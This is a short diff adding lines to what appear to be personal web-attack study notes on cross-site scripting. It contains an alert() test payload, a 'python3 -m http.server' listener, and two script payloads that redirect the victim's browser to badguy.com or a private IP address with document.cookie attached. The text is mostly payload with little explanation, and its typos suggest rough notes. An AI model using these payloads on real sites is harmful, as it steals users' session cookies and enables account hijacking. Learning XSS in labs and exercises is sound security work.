@@ -43,4 +43,10 @@ assu,ing its not im ho,e directory and is running cat
 ## web example
 ## cross
 <script>alert('XSS!');</script>
+vulnerable to cross site scripting
+
+python3 -m http.server
+
+<script>document.location="http://badguy.com/?" + document.cookie;</script>.<script>document.location="http://10.50.21.129" + document.cookie;</script>.
+
 
